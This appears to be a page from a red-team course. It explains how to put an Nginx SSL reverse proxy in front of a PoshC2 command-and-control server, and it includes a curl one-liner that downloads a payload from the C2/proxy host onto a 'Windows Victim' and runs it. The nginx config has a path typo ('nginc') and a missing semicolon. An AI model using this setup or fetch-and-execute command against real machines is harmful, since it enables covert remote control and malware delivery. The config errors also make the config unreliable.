# How to Setup SSL in Nginx

1. First if your poshc2 is still running on port `80` we need to start a new project with using `443`
2. Now lets add our Poshc2 ssl certs from our project folder to nginx
    ```bash
    scp {posh.crt,posh.key} username@<ubuntu-proxy-ip>:.
    ```
    > **NOTE:** This command will scp both files to the users `home` folder
3. Now lets move our ssl certs from our home directory to `/etc/nginx/`
    ```bash 
    mv {posh.crt,posh.key} /etc/nginx/.
    ```
    > **NOTE:** Make sure you are in your users home folder `/home/<username>
4. Then lets move over to our ubuntu server and edit our `/etc/nginx/conf.d/lp_proxy.conf` and add our SSL rules underneath our rules for port 80 comms
    ```nginx
    server {
        listen 443;
        server_name <ubuntu_server_ip>

        ssl_certificate /etc/nginx/posh.crt;
        ssl_certificate_key /etc/nginc/posh.key;
        ssl on;

        location / {
            proxy_pass https://192.168.178.128;
        }
    }
    ```

5. Now reload nginx
    ```
    systemctl restart nginx.service
    ```
6. On our Windows Victim, lets download our hosted payload through our proxy using `curl`
    ```bash
    curl -k https://<posh or proxy IP>/<poshc2-uri> -o apples.exe && .\apples.exe
    ```
7. Boom you now have a HTTPS beacon. 

## [Return to course page](README.md)